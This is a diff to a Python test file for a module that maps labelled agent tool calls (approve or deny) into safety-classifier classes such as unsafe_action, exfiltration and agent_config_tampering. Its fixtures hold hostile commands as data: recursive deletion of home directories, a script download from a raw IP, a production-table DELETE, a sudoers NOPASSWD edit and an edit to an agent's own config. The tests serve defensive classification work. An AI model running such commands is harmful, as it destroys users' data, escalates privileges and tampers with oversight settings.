@@ -236,6 +236,16 @@ def test_matches_searches_a_regular_expression_in_the_field():
     assert not MODULE._check_condition("x", {"field": "path", "matches": "__PI_"})
 
 
+def test_not_matches_is_the_complement_of_matches():
+    rule = {"field": "path", "not_matches": r"__PI_B\d+/"}
+    assert not MODULE.rule_matches(rule, {"path": "malware/000-x__PI_B10/SKILL.md"})
+    assert MODULE.rule_matches(rule, {"path": "malware/002-z__CI_B1/SKILL.md"})
+    # A missing field matches neither.
+    assert not MODULE.rule_matches(rule, {"other": "x"})
+    assert MODULE._check_condition("x", {"field": "path", "not_matches": "("})
+    assert MODULE._check_condition("x", {"field": "path", "matches": "a", "not_matches": "b"})
+
+
 def test_records_needs_format_json_and_a_path():
     labels = {"l"}
     base = {"source": "https://huggingface.co/datasets/o/r", "revision": "a" * 40,
@@ -532,14 +542,33 @@ def test_repository_approve_or_deny_recipe_keeps_german_rows_and_maps_permission
     # The German rows are machine-generated: the set is marked translated, never native German.
     assert dataset.get("translated") is True
 
-    def outcome(label, category, lang="German"):
-        return MODULE.map_labels(entry, dataset, {"text": "x", "label": label, "category": category, "lang": lang})
+    def outcome(label, category, lang="German", call="tool: run_python\nargs: import shutil; shutil.rmtree('/home/mareike')"):
+        text = f"### PROPOSED TOOL CALL\n{call}\n\n### USER REQUEST\nSchau mal, wo der Platz weggeht."
+        return MODULE.map_labels(entry, dataset, {"text": text, "label": label, "category": category, "lang": lang})
 
     assert outcome("deny", "destructive_filesystem")["classes"] == ["unsafe_action"]
     # A call that turns off the agent's own approval, sandbox or permission settings.
     assert outcome("deny", "self_permission_tamper")["classes"] == ["agent_config_tampering", "unsafe_action"]
     assert outcome("deny", "self_permission_tamper")["families"] == {"agent_config_tampering": "permission_widening"}
     assert outcome("deny", "credential_exfiltration")["classes"] == ["exfiltration", "unsafe_action"]
+    # Only a call whose own text carries the risk is scored: shell and CLI tool calls go to shell_command,
+    # every other deny row is risky only against the user's request and stays reported.
+    for call in ("tool: download\nargs: http://203.0.113.7/probe.sh",
+                 'tool: execute\nargs: {"sql": "DELETE FROM prod.app_logs WHERE id < 9;"}',
+                 "tool: run_python\nargs: subprocess.run(['sudo', 'bash', '-c', \"echo 'a ALL=(ALL) NOPASSWD: ALL' >> /etc/sudoers\"])"):
+        assert outcome("deny", "x", call=call)["labels"] == ["deny, risk visible in the proposed call"], call
+    shell = outcome("deny", "x", call="tool: bash\nargs: git reset --hard HEAD~1")
+    assert shell is None
+    assert outcome("deny", "self_permission_tamper", call="tool: shell\nargs: sed -i s/a/b/ ~/.codex/config.toml")["classes"] == [
+        "agent_config_tampering"]
+    contrast = outcome("deny", "x", call='tool: click\nargs: {"selector": "#publish-all"}')
+    assert contrast["classes"] == [] and contrast["reported_classes"] == ["unsafe_action"]
+    # The bucket reads the proposed call only, not the request or the history after it.
+    request_only = MODULE.map_labels(entry, dataset, {
+        "text": "### PROPOSED TOOL CALL\ntool: click\nargs: #run\n\n### USER REQUEST\nDELETE FROM prod.app_logs;",
+        "label": "deny", "category": "x", "lang": "German"})
+    assert request_only["reported_classes"] == ["unsafe_action"]
+    assert outcome("approve", "scary_but_scoped", call="tool: shell\nargs: rm -rf /home/olduser")["benign"] is True
     assert outcome("approve", "scary_but_scoped")["benign"] is True
     # Every other language is out of scope, whatever its label.
     assert outcome("deny", "self_permission_tamper", "English") is None
